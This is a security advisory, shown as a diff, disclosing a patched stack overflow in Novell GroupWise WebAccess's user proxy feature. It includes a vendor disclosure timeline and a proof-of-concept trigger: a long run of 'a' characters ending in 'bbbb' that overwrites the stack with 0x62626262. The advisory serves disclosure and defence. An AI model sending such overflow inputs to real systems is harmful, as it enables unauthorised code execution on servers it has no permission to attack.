@@ -1,0 +1,91 @@
+#####################################################################################
+
+Application:   Novell Groupwise Webaccess Stack Overflow
+
+Platforms:   Windows, Linux & Netware (GroupWise 7.0, 7.01, 7.02, 7.03x, 7.04, 8.0, 8.01x)
+
+Exploitation:   Remote code execution
+
+CVE Number:  
+
+Novell TID:  7006380
+
+Author:   Francis Provencher (Protek Research Lab's)
+
+Blog:   http://www.protekresearchlab.com/
+
+
+#####################################################################################
+
+1) Introduction
+2) Report Timeline
+3) Technical details
+4) The Code
+
+
+#####################################################################################
+
+===============
+1) Introduction
+===============
+
+Novell, Inc. is a global software and services company based in Waltham, Massachusetts. The company specializes in enterprise operating systems, such as SUSE Linux Enterprise and Novell NetWare; identity, security, and systems management solutions; and collaboration solutions, such as Novell Groupwise and Novell Pulse.
+
+Novell was instrumental in making the Utah Valley a focus for technology and software development. Novell technology contributed to the emergence of local area networks, which displaced the dominant mainframe computing model and changed computing worldwide. Today, a primary focus of the company is on developing open source software for enterprise clients.
+
+(http://en.wikipedia.org/wiki/Novell)
+
+#####################################################################################
+
+============================
+2) Report Timeline
+============================
+
+2010-05-27 Vendor Contact
+2010-05-28 Vendor repsonse
+2010-07-15 Patch is release
+
+
+#####################################################################################
+
+============================
+3) Technical details
+============================
+
+The user Proxy feature of Novell GroupWise WebAccess is vulnerable to a stack overflow exploit. An authenticated user could potentially trigger and execute arbitrary code with "Root" or "SYSTEM" rigths. To overwrite the stack, 1294 byte have to been sent to the user proxy feature.
+
+#####################################################################################
+
+===========
+4) The Code
+===========
+
+This issue can be trigger manually;
+
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+
+aaaaaaaaaaaaaaaaabbbb
+
+The stack will be overwrite with 0x62626262
